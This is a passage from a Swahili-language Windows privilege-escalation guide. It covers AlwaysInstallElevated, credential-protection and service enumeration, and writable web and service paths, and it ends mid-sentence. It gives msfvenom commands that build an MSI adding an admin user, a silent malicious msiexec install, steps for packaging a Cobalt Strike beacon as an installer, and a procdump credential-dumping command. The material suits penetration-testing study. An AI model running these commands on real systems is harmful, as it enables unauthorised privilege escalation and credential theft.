Kagua sera halisi ya DC ya [LDAP signing](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-signing) na [LDAPS channel-binding](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-channel-binding), ACL ya object ya utambulisho uliorerelayiwa, na viwango vya uthibitishaji na uigaji vya COM class iliyochaguliwa. Aina ya logon ya caller na muktadha wa credential ni muhimu: kikao cha WinRM kinaweza kufanya kazi tofauti na logon ya maingiliano au ya new-credentials. Routing ya firewall/OXID na updates zilizosakinishwa pia zinaweza kubadilisha matokeo. Chukulia sera inayoruhusu au ACL inayolingana kuwa jambo la kuchunguzwa; uhesabuji tulivu haupaswi kuanzisha COM coercion, relay authentication, au uandishi kwenye directory. Shadow credential ya machine-account inaweza kusababisha machine ticket na, ikiwa tu akaunti hiyo ina ruhusa zinazohitajika za directory replication, njia tofauti ya DCSync.

Tafuta **exploit kwenye** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Kwa maelezo zaidi kuhusu mtiririko wa shambulio, angalia [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)<sup>[[36]](#references)</sup>

## AlwaysInstallElevated

**Ikiwa** funguo hizi 2 za Registry **zimewashwa** (thamani ni **0x1**), basi watumiaji wa kiwango chochote cha ruhusa wanaweza **kusakinisha** (kutekeleza) faili za `*.msi` kama NT AUTHORITY\\**SYSTEM**.

```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Metasploit payloads

```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac won't be prompted
```

Ikiwa una meterpreter session, unaweza kuendesha mbinu hii kiotomatiki kwa kutumia module **`exploit/windows/local/always_install_elevated`**

### PowerUP

Tumia amri ya `Write-UserAddMSI` kutoka power-up ili kuunda binary ya Windows MSI kwenye saraka ya sasa kwa ajili ya kuongeza marupurupu. Script hii huandika installer ya MSI iliyokwishakusanywa, ambayo huomba kuongeza mtumiaji/kikundi (kwa hivyo utahitaji ufikiaji wa GIU):

```
Write-UserAddMSI
```

Endesha tu binary iliyoundwa ili kuongeza privileges.

### MSI Wrapper

Soma mafunzo haya ili ujifunze jinsi ya kuunda MSI wrapper kwa kutumia tools hizi. Kumbuka kuwa unaweza kufunga faili ya "**.bat**" ikiwa **unataka tu** **kutekeleza** **mistari ya amri**


{{#ref}}
msi-wrapper.md
{{#endref}}

### Unda MSI kwa WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Unda MSI kwa Visual Studio

- **Tengeneza** Windows EXE TCP payload **mpya** kwa kutumia Cobalt Strike au Metasploit katika `C:\privesc\beacon.exe`
- Fungua **Visual Studio**, chagua **Create a new project** na uandike "installer" kwenye kisanduku cha kutafutia. Chagua mradi wa **Setup Wizard** na ubofye **Next**.
- Weka jina la mradi, kama vile **AlwaysPrivesc**, tumia **`C:\privesc`** kama eneo, chagua **place solution and project in the same directory**, kisha ubofye **Create**.
- Endelea kubofya **Next** hadi ufike hatua ya 3 kati ya 4 (chagua faili za kujumuisha). Bofya **Add** na uchague Beacon payload uliyotengeneza hivi punde. Kisha ubofye **Finish**.
- Chagua mradi wa **AlwaysPrivesc** katika **Solution Explorer** na kwenye **Properties**, badilisha **TargetPlatform** kutoka **x86** hadi **x64**.
  - Kuna properties nyingine unazoweza kubadilisha, kama vile **Author** na **Manufacturer**, ambazo zinaweza kufanya programu iliyosakinishwa ionekane halali zaidi.
- Bofya mradi kwa kitufe cha kulia na uchague **View > Custom Actions**.
- Bofya **Install** kwa kitufe cha kulia na uchague **Add Custom Action**.
- Bofya mara mbili **Application Folder**, chagua faili yako ya **beacon.exe** na ubofye **OK**. Hii itahakikisha kuwa Beacon payload inatekelezwa mara tu installer inapoendeshwa.
- Chini ya **Custom Action Properties**, badilisha **Run64Bit** kuwa **True**.
- Mwishowe, **ijenge**.
  - Ikiwa onyo `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` litaonyeshwa, hakikisha umeweka platform kuwa x64.

### Usakinishaji wa MSI

Ili kutekeleza **usakinishaji** wa faili hasidi ya `.msi` **chinichini:**

```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```

Ili kutumia udhaifu huu unaweza kutumia: _exploit/windows/local/always_install_elevated_

## Antivirus and Detectors

### Mipangilio ya Ukaguzi

Mipangilio hii huamua kinachorekodiwa, kwa hivyo unapaswa kuizingatia.

```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```

### WEF

Windows Event Forwarding, inavutia kujua logi zinatumwa wapi.

```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```

### LAPS

**LAPS** imeundwa kwa ajili ya **usimamizi wa nywila za Administrator wa ndani**, kuhakikisha kwamba kila nywila ni **ya kipekee, inatengenezwa kwa nasibu, na husasishwa mara kwa mara** kwenye kompyuta zilizojiunga na domain. Nywila hizi huhifadhiwa kwa usalama ndani ya Active Directory na zinaweza kufikiwa tu na watumiaji waliopewa ruhusa za kutosha kupitia ACLs, hivyo kuwaruhusu kuona nywila za admin wa ndani ikiwa wameidhinishwa.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Ikiwa imewashwa, **nywila za maandishi wazi huhifadhiwa katika LSASS** (Local Security Authority Subsystem Service).\
[**Maelezo zaidi kuhusu WDigest kwenye ukurasa huu**](../stealing-credentials/credentials-protections.md#wdigest).

```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```

### Ulinzi wa LSA

Kuanzia **Windows 8.1**, Microsoft ilianzisha ulinzi ulioimarishwa kwa Local Security Authority (LSA) ili **kuzuia** michakato isiyoaminika kujaribu **kusoma kumbukumbu yake** au kuingiza msimbo, na hivyo kuimarisha zaidi usalama wa mfumo.\
[**Maelezo zaidi kuhusu Ulinzi wa LSA hapa**](../stealing-credentials/credentials-protections.md#lsa-protection).

```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```

### Credentials Guard

**Credential Guard** ilianzishwa katika **Windows 10**. Madhumuni yake ni kulinda credentials zilizohifadhiwa kwenye kifaa dhidi ya vitisho kama vile mashambulizi ya pass-the-hash. [**Maelezo zaidi kuhusu Credential Guard yanapatikana hapa.**](../stealing-credentials/credentials-protections.md#credential-guard)

```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```

### Vitambulisho Vilivyohifadhiwa kwenye Akiba

**Vitambulisho vya domain** huthibitishwa na **Local Security Authority** (LSA) na kutumiwa na vipengele vya mfumo wa uendeshaji. Data ya mtumiaji ya kuingia inapothibitishwa na kifurushi cha usalama kilichosajiliwa, kwa kawaida vitambulisho vya domain vya mtumiaji huanzishwa.\
[**Maelezo zaidi kuhusu Vitambulisho Vilivyohifadhiwa kwenye Akiba hapa**](../stealing-credentials/credentials-protections.md#cached-credentials).

```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```

## Watumiaji na Vikundi

### Orodhesha Watumiaji na Vikundi

Unapaswa kuangalia ikiwa kikundi chochote unachoshiriki kina ruhusa muhimu zaidi kuliko kawaida.

```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```

### Makundi yenye mamlaka

Ikiwa **uko katika kundi fulani lenye mamlaka, unaweza kuweza kuongeza mamlaka yako**. Jifunze kuhusu makundi yenye mamlaka na jinsi ya kuyatumia vibaya ili kuongeza mamlaka yako hapa:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Udanganyifu wa tokeni

**Jifunze zaidi** kuhusu **tokeni** ni nini katika ukurasa huu: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Angalia ukurasa ufuatao ili **ujifunze kuhusu tokeni zinazovutia** na jinsi ya kuzitumia vibaya:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Watumiaji walioingia / Vipindi vya kazi

```bash
qwinsta
klist sessions
```

### Folda za nyumbani

```bash
dir C:\Users
Get-ChildItem C:\Users
```

### Sera ya Nenosiri

```bash
net accounts
```

### Pata maudhui ya ubao wa kunakili

```bash
powershell -command "Get-Clipboard"
```

## Michakato Inayoendesha

### Ruhusa za Faili na Folda

Kwanza kabisa, unapoorodhesha michakato, **angalia kama kuna manenosiri ndani ya command line ya mchakato**.\
Angalia kama unaweza **kubadilisha binary yoyote inayoendesha** au kama una ruhusa ya kuandika kwenye folda ya binary ili kutumia [**DLL Hijacking attacks**](dll-hijacking/index.html) zinazowezekana:

```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```

Kagua kila mara kama [**electron/cef/chromium debuggers** zinaendesha; unaweza kuzitumia vibaya ili escalate privileges](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md).

Debugger listener inaweza kuwa hai kwa muda mfupi, kwa hivyo kutokuwepo kwake katika snapshot moja ya passive ya port hakuthibitishi kuwa haikuwahi kufichuliwa. Linganisha listener yoyote uliyoona na PID yake, mmiliki wa process, na uwezo wa mtumiaji mwenye privileges za chini kuifikia; jina la application au debug flag pekee halithibitishi uwezo wa kutekeleza code kutoka kwa mtumiaji mwingine. Fanya enumeration ya kawaida iwe passive badala ya kutuma debugger commands.

**Kukagua ruhusa za binaries za processes**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
	for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
		icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
	)
)
```

**Kukagua ruhusa za folda zenye binary za michakato (**[**DLL Hijacking**](dll-hijacking/index.html)**)**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
	icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```

### Saraka za Snort dynamic preprocessor

Snort 2 inaweza kupakia shared libraries kutoka kwenye saraka ya `dynamicpreprocessor directory` iliyotajwa kwenye usanidi uliochaguliwa kwa kutumia `snort.exe -c <config>`. Kwa scheduled task au service inayoendesha Snort chini ya akaunti tofauti, kagua usanidi huo mahususi na ACL za saraka ya moduli iliyotajwa. Ikiwa token yako inaweza kuunda faili hapo, njia hiyo inafaa kuchunguzwa kama eneo linaloweza kuruhusu code execution task au service hiyo itakapopakia modules tena. Hakikisha unaangalia effective privileges za akaunti ya run-as, usanidi unaotumika, ulinganifu wa modules, na vizuizi vyovyote vya deny au share; saraka inayoweza kuandikika peke yake haithibitishi privilege escalation. [Nyaraka za Snort kuhusu dynamic-preprocessor](https://www.snort.org/documents/dpx-readme) zinaeleza upakiaji wa modules wakati wa runtime.

### Huduma ya wavuti yenye upendeleo na document root inayoweza kuandikika

Kwenye usakinishaji wa Apache wa Windows, linganisha njia ya executable ya service na akaunti ya run-as na `DocumentRoot` iliyo kwenye `httpd.conf` inayotumika. Kwa mpangilio wa kawaida wa XAMPP, kagua `C:\xampp\apache\conf\httpd.conf` na ACL ya document root iliyosanidiwa, mara nyingi `C:\xampp\htdocs`. Ikiwa mtumiaji mwenye upendeleo mdogo anaweza kuunda faili kwenye root hiyo huku Apache ikiendeshwa kama `LocalSystem`, code execution ya server-side inaweza kuvuka mpaka wa upendeleo wa host. Thibitisha kuwa service inaendeshwa, njia hiyo mahususi inatolewa, na handler ya server-side inachakata aina ya faili husika; root inayoweza kuandikika peke yake inathibitisha tu kuwa faili zinaweza kuundwa. Kagua ACL bila kuandika probe:

```powershell
Get-CimInstance Win32_Service -Filter "Name='Apache2.4'" | Select-Object Name, State, StartName, PathName
Select-String -Path 'C:\xampp\apache\conf\httpd.conf' -Pattern '^\s*DocumentRoot\s+'
icacls 'C:\xampp\htdocs'
```

Kwa usakinishaji wa kawaida wa WAMP, service inaweza kuelekeza kwenye `C:\wamp64\bin\apache\apache*\bin\httpd.exe` yenye toleo maalum (au `C:\wamp\...` kwa mpangilio wa biti 32), ikiwa na usanidi karibu nayo chini ya `conf\httpd.conf` na root chaguomsingi ya `C:\wamp64\www` au `C:\wamp\www`. Kagua pamoja picha halisi ya service, utambulisho unaotumika kuiendesha, `DocumentRoot` inayotumika (ikiwemo upanuzi wa `${INSTALL_DIR}` na mabadiliko ya virtual host), na ACL ya root. Saraka ya WAMP inayoweza kuandikwa haithibitishi kwamba Apache inaendeshwa kama `SYSTEM` au inatekeleza faili iliyowasilishwa. [Apache inaeleza jinsi service ya Windows huchagua usanidi wake](https://httpd.apache.org/docs/2.4/platform/windows.html#winnt-service).

### Root ya IIS inayoweza kuandikwa na utambulisho wa mtandao wa application pool

Kwa IIS, linganisha saraka halisi inayoweza kuandikwa na **site/application inayotumika** katika `applicationHost.config`, kisha tambua pool yake iliyosanidiwa na handler ya upande wa server. Code iliyowekwa kwenye saraka inayotolewa kupitia web huendeshwa kama pool ikiwa tu IIS inachakata aina hiyo ya faili na route inaweza kufikiwa. Kagua ruhusa za sasa za mtumiaji za kuunda faili, hali ya runtime ya site, handler na mabadiliko kwa kila path kabla ya kuhitimisha kuwa saraka inayoweza kuandikwa inaruhusu utekelezaji wa code.

Compilation ya ASP.NET inayofanyika wakati wa runtime huleta path tofauti ya kuchunguza: faili zinazozalishwa chini ya saraka ya compilation ya application. Chaguomsingi ni saraka ya `Temporary ASP.NET Files` chini ya usakinishaji husika wa .NET Framework, lakini `<compilation tempDirectory>` ya application inaweza kuibadilisha. [Microsoft inaeleza eneo hilo na saraka ndogo za kila application](https://learn.microsoft.com/en-us/previous-versions/aspnet/ms366723%28v%3Dvs.100%29) na [inapendekeza kutenganisha saraka za compilation pale application pool zisipoaminiana](https://learn.microsoft.com/en-us/iis/manage/creating-websites/provisioning-iis-7-sites-for-shared-hosting#configuring-aspnet-temporary-compilation-directories). Ikiwa tokeni yenye ruhusa za chini inaweza kubadilisha source code inayozalishwa kwenye cache ya **application husika**, chunguza kama application hiyo ita-compile upya chini ya [utambulisho wa worker process](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities) wenye ruhusa za juu zaidi. ACL ya faili au saraka peke yake haithibitishi utekelezaji wa code: linganisha cache na application inayotumika, tokeni na ACL zinazotumika, mipangilio ya compilation, utambulisho wa process, na muda wa compilation upya. Tumia ukaguzi wa metadata usiobadilisha data; usichochee compilation wala kubadilisha faili za cache wakati wa enumerations.

IIS pool iliyosanidiwa kama `ApplicationPoolIdentity` au `NetworkService` kwa kawaida hujithibitisha kwenye rasilimali za domain kwa kutumia **akaunti ya kompyuta mwenyeji**, ingawa tokeni yake ya ndani inaweza kuwa na ruhusa za chini. `LocalSystem` tayari ina ruhusa za juu sana ndani ya mfumo na pia hutumia akaunti ya kompyuta kwenye mtandao; `LocalService` kwa kawaida hutumia taarifa za uthibitishaji za mtandao zisizojulikana. Pool ya `SpecificUser` hutumia akaunti yake iliyosanidiwa. [Microsoft inaeleza aina hizi za utambulisho](https://learn.microsoft.com/en-us/iis/configuration/system.applicationhost/applicationpools/add/processmodel) na [utambulisho wa mtandao wa application pool](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities). Ikiwa mpangilio wa utambulisho haujawekwa, pool inaweza kurithi chaguomsingi zake, ambazo hutofautiana kati ya matoleo ya IIS; kwa hiyo, tambua usanidi unaotumika badala ya kubashiri kutokana na jina la pool. Ikiwa utekelezaji wa code unafikia pool yenye utambulisho wa mtandao wa akaunti ya kompyuta, tathmini ruhusa za directory za **kompyuta hiyo mahususi**. [DCSync](../active-directory-methodology/dcsync.md) huhitaji ruhusa za replication kwenye domain naming context; tiketi ya akaunti ya mashine au jukumu la host pekee halithibitishi ruhusa hizo. Enumeration tulivu inapaswa kukagua usanidi na ACL bila kupakia faili, kuanzisha uthibitishaji wa mtandao, au kuomba tiketi.

Kwa handler ya ASP.NET inayosomeka na inayoanzisha helper process, fuatilia thamani yoyote inayotokana na request kupitia uthibitishaji, decryption, validation, na uundaji wa command. Handler inayounganisha tokeni iliyodecode kwenye `ProcessStartInfo("cmd", "/c ...")` inaweza kuruhusu shell metacharacters kubadilisha command; [Microsoft inaeleza herufi maalum za `cmd`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmd). Thibitisha kwamba caller asiyeaminika anaweza kweli kuathiri thamani iliyodecode na kufikia handler, kisha tambua utambulisho unaotumika wa application pool au wa impersonation na utambulisho wa child process. Mstari wa source unaosomeka, listener ya localhost, au udhaifu wa muundo wa tokeni pekee hauthibitishi utekelezaji wa command wenye ruhusa za juu. Kagua source na usanidi wa pool bila kutuma requests ghushi au kuendesha helper wakati wa enumeration tulivu.

Kwa PHP service kwenye Windows, path inayodhibitiwa na request na kupitishwa kwa [`include` au `require`](https://www.php.net/manual/en/function.include.php) inaweza kutekeleza faili ya PHP inayoweza kuandikwa na mtumiaji wa chini chini ya utambulisho wa worker. Thibitisha kwamba request inaweza kufikia kauli hiyo, path iliyotatuliwa inataja faili ambayo mtumiaji wa chini anaweza kubadilisha na worker anaweza kusoma, vizuizi husika vya PHP vya path vinaruhusu include, na worker inaendeshwa kwa ruhusa za juu zaidi. Listener ya loopback au faili inayoweza kuandikwa pekee haithibitishi mnyororo huu; kagua source, utambulisho wa service, na ACL za faili bila kuita endpoint wakati wa enumeration tulivu.

### Uchimbaji wa nywila kwenye kumbukumbu

Unaweza kuunda memory dump ya process inayoendeshwa kwa kutumia **procdump** kutoka sysinternals. Services kama FTP huwa na **credentials katika maandishi ya kawaida kwenye kumbukumbu**; jaribu kudump memory na kusoma credentials.

```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```

### Programu za GUI zisizo salama

**Programu zinazoendeshwa kama SYSTEM zinaweza kumruhusu mtumiaji kufungua CMD, au kuvinjari saraka.**

Mfano: "Windows Help and Support" (Windows + F1), tafuta "command prompt", bofya "Click to open Command Prompt"

### Uingizaji wa faili za mradi zenye ruhusa za juu

Programu inayofungua miradi kiotomatiki kutoka kwenye saraka ya kushusha faili inayoweza kuandikwa na mtumiaji mwenye ruhusa za chini huvuka mpaka wa uaminifu wa ingizo chini ya akaunti ya programu inayoingiza faili hizo. Kagua **njia halisi inayoweza kuandikwa**, mchakato au kazi inayoifungua, utambulisho wake unaotumika, na toleo la parser. Tatizo la kihistoria la kufungua/kurejesha mradi wa Ghidra kwenye [Ghidra](https://github.com/NationalSecurityAgency/ghidra/issues/71) liliruhusu XML external entities kwenye metadata ya mradi; entity ya mtandao kwenye Windows inaweza kusababisha uthibitishaji kutoka kwa akaunti inayoingiza faili hizo ikiwa [sera za SMB na NTLM za trafiki inayotoka](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-ntlm-blocking) zinaruhusu. Hii ni dalili ya uwezekano wa kufichuka kwa vitambulisho, si ufikiaji wa msimamizi wa moja kwa moja: jibu lazima liweze kutumiwa kupitia njia tofauti iliyoidhinishwa au iliyo hatarini, na matoleo ya sasa lazima yakaguliwe kulingana na hali halisi ya viraka vyake. Usifungue mradi uliotengenezwa mahsusi wakati wa uchunguzi tuli; kagua mtiririko wa uingizaji na ACLs.

## Huduma

Ruhusa ya [`SC_MANAGER_CREATE_SERVICE`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) kwenye kitu cha Service Control Manager (SCM) ni tofauti na ruhusa kwenye huduma iliyopo. Ombi la ufikiaji la kusoma pekee la [`OpenSCManager`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openscmanagerw) linalofanikiwa kwa ruhusa hiyo ni dalili ya kuchunguza, si uthibitisho kwamba huduma mpya inaweza kuendeshwa. [`CreateService` hurudisha handle](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicew) yenye ruhusa za huduma zilizoombwa wakati wa kuunda; kuifungua tena huduma baadaye hufanya ukaguzi tofauti wa ufikiaji na kunaweza kushindwa hata wakati handle ya awali ingeweza kutumika. Thibitisha tokeni ya ndani au ya mbali inayotumika, ruhusa za handle zilizotolewa, akaunti ya huduma, sera ya kuanzisha, na njia ya executable kando kando. Usitengeneze wala kuanzisha huduma wakati wa uchunguzi tuli.

Kwa njia ya kusakinisha huduma kwa mbali, linganisha ruhusa hizo za SCM na share kwenye lengwa ambayo **logon hiyo hiyo ya mtandao** inaweza kuiandikia, ACL yake ya msingi ya NTFS, na njia ya ndani ya executable ambayo akaunti ya huduma inaweza kuendesha. Akaunti isiyo ya admin inaweza kuvuka mpaka huu ikiwa kuna ruhusa pana isivyo kawaida za SCM na njia ya kuweka faili; share ya msimamizi si sharti la lazima. Ruhusa ya kuandika kwenye share pekee, au dalili ya ruhusa ya kuunda huduma ya SCM pekee, haithibitishi kwamba huduma mpya inaweza kuanzishwa chini ya utambulisho wa juu zaidi.

Huduma iliyopo inaweza kuita executable saidizi inapowashwa, inapozimwa, au wakati wa tukio jingine la mzunguko wa maisha, hata kama executable hiyo saidizi haipo kwenye `ImagePath` yake. Ikiwa jina la executable saidizi linatatuliwa kuwa saraka inayoweza kuandikwa na mtumiaji mwenye ruhusa za chini na huduma inaendeshwa chini ya utambulisho wa juu zaidi, faili saidizi inayokosekana inaweza kuwa mgombea wa kubadilishwa kwa masharti. Thibitisha **msimbo halisi wa huduma au mwito wa executable saidizi ulioandikwa kwenye nyaraka**, njia ya executable iliyotatuliwa na mpangilio wa utafutaji, ruhusa za kuunda saraka, utambulisho wa huduma, na kichocheo cha mzunguko wa maisha kinachopatikana. Saraka ya huduma inayoweza kuandikwa au faili inayokosekana pekee haithibitishi kwamba huduma inapakia faili hiyo; ukaguzi tuli haupaswi kuanzisha au kusimamisha huduma.

Kwa huduma iliyopo, [`SERVICE_START` huruhusu kutoa hoja kwa `StartService`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-startservicew); ni tofauti na [`SERVICE_CHANGE_CONFIG`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights). Kagua msimbo wa huduma au kiolesura chake kilichoandikwa kwenye nyaraka kabla ya kuchukulia ruhusa ya kuanzisha kama kitu zaidi ya ruhusa ya udhibiti. Ikiwa huduma inatumia hoja iliyochaguliwa na mpigaji kama njia ya log au export, thibitisha utambulisho wa huduma, mtiririko halisi wa hoja hadi uandishi, vizuizi vya njia, na ruhusa za **faili iliyoundwa**. Uandishi kwenye saraka iliyolindwa unaweza kuwa njia ya kupata ruhusa za juu zaidi tu ikiwa kuna mtumiaji au loader tofauti mwenye ruhusa za juu anayeikubali faili hiyo; log inayoweza kuandikwa au ruhusa ya kuanzisha pekee haitoshi. Orodha tuli haipaswi kuanzisha huduma au kuunda faili ya majaribio.

Kwa wakala wa ufuatiliaji wa NSClient++, `nsclient.ini` inayosomeka ni **dalili ya kuchunguza usanidi**: inaweza kuwa na vitambulisho vya web, huku `boot.ini` ikiweza kuelekeza usanidi kwenye eneo jingine. Kagua akaunti halisi ya huduma, listener ya WEB na sera ya ufikiaji, na ikiwa jukumu lililoidhinishwa linaweza kubadilisha mipangilio au scripts. Utekelezaji wenye ruhusa za juu pia unahitaji `CheckExternalScripts` (au njia nyingine ya utekelezaji iliyowezeshwa), ruhusa halali ya kusajili au kurekebisha amri, na kichocheo kinachoitekeleza chini ya utambulisho wa huduma. Listener inayopatikana tu kupitia loopback bado inaweza kufikiwa na mtumiaji wa ndani, lakini njia ya faili, nenosiri, au listener pekee havithibitishi ruhusa hizo. Kagua metadata na ruhusa bila kuonyesha siri au kuita web API wakati wa uchunguzi tuli. Tazama [mpangilio wa faili za NSClient++](https://nsclient.org/docs/concepts/file-layout/), [mwongozo wa usalama wa web na script](https://nsclient.org/docs/setup/securing/), na [usanidi wa external-script](https://nsclient.org/docs/reference/check/CheckExternalScripts/).

Kwa huduma ambayo `ImagePath` yake ni `nssm.exe`, kagua akaunti halisi ambayo huduma huendeshwa chini yake na thamani yake ya `HKLM\SYSTEM\CurrentControlSet\Services\<name>\Parameters\Application`: [NSSM huhifadhi programu tanzu hapo](https://git.nssm.cc/nssm/nssm/src/96e7f4484a3dc962482c240909fd52b0e0226a60/registry.h), huku `AppDirectory` ikiwa saraka yake ya kazi iliyosanidiwa. Kagua executable tanzu na ACLs za saraka zake za mzazi kabla ya kuchukulia ruhusa za wrapper kuwa ndizo pekee zinazounda mpaka wa huduma. Endpoint ya ndani ya WCF au SOAP inayoonyeshwa na programu tanzu hiyo ni dalili tofauti ya kuchunguza: thibitisha kuwa mtumiaji mwenye ruhusa za chini anaweza kufikia listener, operesheni husika inakubali ingizo lake, na programu tanzu ya huduma inatekeleza operesheni isiyo salama chini ya utambulisho wa juu zaidi. Akaunti ya huduma, URL ya endpoint, au njia inayoweza kuandikwa pekee havithibitishi kuongezeka kwa ruhusa; epuka kuita operesheni za huduma wakati wa uchunguzi tuli.

Kwa operesheni maalum ya WCF, fuatilia mfuatano unaodhibitiwa na mpigaji hadi kwenye PowerShell runspace yoyote. [`Pipeline.Commands.AddScript huongeza maandishi ya script`](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.commandcollection.addscript), na [`Pipeline.Invoke huendesha pipeline`](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.pipeline.invoke). [`netTcpBinding` yenye vitambulisho vya Windows vya usafirishaji](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/wcf/transport-of-nettcpbinding) humthibitisha mteja, lakini ruhusa ya kuita **operesheni hiyo mahususi** na utambulisho halisi wa runspace lazima vikaguliwe kando. Njia kutoka kwenye ingizo la mpigaji mwenye ruhusa za chini hadi `AddScript` chini ya utambulisho wa huduma wenye ruhusa za juu zaidi ni mpaka wa utekelezaji wa msimbo; port inayosikilizwa, mteja aliyethibitishwa, au method isiyotumika kwenye assembly isiyohusiana pekee si uthibitisho. Kagua huduma iliyowekwa, contract, uidhinishaji, na mipangilio ya impersonation kwa njia tuli bila kuita endpoint wakati wa uchunguzi.

Service Triggers huruhusu Windows kuanzisha huduma hali fulani zinapotokea (shughuli za named pipe/RPC endpoint, matukio ya ETW, upatikanaji wa IP, kifaa kuunganishwa, GPO refresh, n.k.). Hata bila ruhusa za SERVICE_START, mara nyingi unaweza kuanzisha huduma zenye ruhusa za juu kwa kuwasha triggers zake. Tazama mbinu za kuorodhesha na kuwasha hapa:

-
{{#ref}}
service-triggers.md
{{#endref}}

### Huduma ya Visual Studio diagnostic collector

Usakinishaji wa Visual Studio wenye zana za C/C++ unaweza kujumuisha `VSStandardCollectorService150`, huduma ya diagnostic iliyosanidiwa kuendeshwa kama `LocalSystem`. [CVE-2024-20656](https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/) ilitumia race ya junction na object-manager-link kuelekeza upya uwekaji upya wa DACL ya huduma. Kuongezeka kwa ruhusa kulikkoonyeshwa pia kulihitaji njia inayoweza kutumika ya kurekebisha MSI ya Visual Studio Setup WMI Provider na lengwa lake la `C:\ProgramData\Microsoft\VisualStudio\SetupWMI\MofCompiler.exe`. Kipengele hiki kilirekebishwa Januari 2024.

Kwa uchunguzi tuli wa awali, kagua akaunti na njia ya binary ya huduma hiyo pekee, angalia kama njia ya Setup WMI compiler ipo, na thibitisha hali ya viraka ya kipengele kilichosakinishwa. Ingizo la huduma, toleo la bidhaa la Visual Studio, au faili ya compiler pekee havithibitishi kwamba mfumo una hatari. Ukaguzi hauhitaji kuanzisha huduma au kuendesha repair.

Pata orodha ya huduma:

```bash
net start
wmic service list brief
sc query
Get-Service
```

### Ruhusa

Unaweza kutumia **sc** kupata taarifa kuhusu huduma.

```bash
sc qc <service_name>
```

Inapendekezwa kuwa na binary **accesschk** kutoka _Sysinternals_ ili kuangalia kiwango cha ruhusa kinachohitajika kwa kila huduma.

```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```

Inapendekezwa kuangalia kama "Authenticated Users" wanaweza kurekebisha huduma yoyote:

```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```

[Unaweza kupakua accesschk.exe ya XP hapa](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Wezesha huduma

Ikiwa unapata hitilafu hii (kwa mfano, na SSDPSRV):
